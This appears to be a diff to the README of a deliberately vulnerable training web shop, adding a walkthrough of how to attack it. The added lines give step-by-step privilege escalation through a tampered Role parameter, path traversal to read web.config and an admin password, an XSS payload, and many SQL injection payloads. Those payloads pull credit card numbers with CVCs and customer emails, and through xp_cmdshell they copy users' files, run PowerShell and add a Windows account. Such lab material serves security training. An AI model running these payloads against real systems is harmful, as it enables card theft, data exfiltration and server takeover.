@@ -7,12 +7,48 @@ Based on the old Microsoft tutorial for MvcMusicStore found at https://docs.micr
 This is a walktrough of a path to discover the vulnerabilities of this web app.
 
 ### Recon
-Start by running a nikto or sparta scan
+Start by browsing the website.
+Try to place an order in the shop and see what happens as a regular user. 
+We notice the checkout flow want's us to create a user and we can later log in with that user. We can also create a user without shopping.
+We notice a big search field in the top where we can search for products.
+At the bottom of the page there is a link to a contact form where users can contact and upload files to customerservice.
+On the frontpage there is also a review page where users can submit reviews.
+Check the website for response headers and cookies, and see what information can be gathered here.
 
 
 ### Enumeration
+We can run a free webscanner tool if available, eg. nikto, sparta or Owasp Zap. And see what vulnerabilities the scanner can find.
 
-## Exploitation
+
+### Exploitation
+Let's try to gain admin access to the web application. 
+Try different logins to try and brute force. This is a slow process even using automated tools like Burp.
+
+1. Create a new user on the [http://localhost:50881/Account/Register] Register page using firefox and open developer tools on the network tab. 
+...Notice the POST parameters. 
+...Notice the Role parameter which is empty. Try to enter Administrator to the user role, and resend. 
+...We are now logged in as admin and has successfully escalated our priviledges! 
+
+2. As an admin try to create a new product
+
+3. Visit details for the Hugo Boss product, item number 1001.
+
+4. Click the link 'View backup pdf'. Check the link url.
+
+5. Using path traversal we can download the web.config file using this link http://localhost:50881/StoreManager/Download?fileName=../web.config 
+
+6. From the web.config we learn the password of the admin user: bob@taxfree.com : incorrect
+
+7. Now login as Bob so all history will be on his account.
+
+8. Go to reviews page and test XSS, <img src=x onerror=alert('XSS');> 
+
+9. File Upload get shell
+
+10. SQLi
+
+
+TODO Payments
 
 
 
@@ -94,6 +130,11 @@ Here are some examples that might get you started:
 	x' AND 1 IN (SELECT @@version) --
 	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT 1) as varchar(4096))) -- (replace select statement with the sql you want to execute)
 	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT TOP 1 Email FROM Orders) as varchar(4096))) --
+	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT TOP 1 'CardNo:' + LTRIM(RTRIM(CardNumber)) + '/expdate' + LTRIM(RTRIM(ExpDate)) + '/cvc' + LTRIM(RTRIM(CVC)) + '/' + LTRIM(RTRIM(CardHolderName)) FROM CreditCards) as varchar(4096))) --
+
+	x' AND 1 IN (SELECT 'Extract:' + CAST((SELECT Email FROM (SELECT ROW_NUMBER() OVER(ORDER BY OrderId) AS RoNum, OrderId, Email FROM Orders) AS tbl WHERE RoNum = 3) as varchar(4096))) --
+
+	
 
 	If xp_cmdshell is not available try:
 
@@ -104,12 +145,12 @@ Here are some examples that might get you started:
 
 	Then try this	
 	x'; exec master..xp_cmdshell 'copy %HOMESHARE%\Fakturaer\*.pdf C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads'; --
-	x'; exec master..xp_cmdshell 'xcopy %HOMESHARE%\*.doc C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads /sy';
+	x'; exec master..xp_cmdshell 'xcopy %HOMESHARE%\*.doc C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads /sy'; -- (copies all doc files in folders and subfolders and overwrites if need be)
 
 	Output is not shown as this is a blind injection.
 
-	exec master..xp_cmdshell 'whoami.exe' (current username)
-	exec master..xp_cmdshell 'cd' (print working directory)
+	x'; exec master..xp_cmdshell 'whoami.exe'; -- (current username)
+	x'; exec master..xp_cmdshell 'cd'; -- (print working directory)
 
 	Add administrator
 	exec master..xp_cmdshell 'net user foobar Password123 /add'; -- 
@@ -133,7 +174,7 @@ Here are some examples that might get you started:
 	Or combine this with the file upload vulnerability (see next section).
 	
 	This prints the contents of local folder to dir_out.txt file
-	x'; DECLARE @cmd sysname, @var sysname;SET @var = 'dir/p';SET @cmd = @var + ' > C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads\dir_out.txt';EXEC master..xp_cmdshell @cmd; --
+	x'; DECLARE @cmd sysname, @var sysname;SET @var = 'dir ..\..\..\..\ /p';SET @cmd = @var + ' > C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads\dir_out.txt';EXEC master..xp_cmdshell @cmd; --
 
 	More fun with powershell. See what services are running on the server:
 	x'; DECLARE @cmd sysname, @var sysname;SET @var = 'PowerShell.exe -noprofile Get-Service';SET @cmd = @var + ' > C:\Dev\Sandbox\MvcProductStore\MvcProductStore\Uploads\dir_out.txt';EXEC master..xp_cmdshell @cmd; --
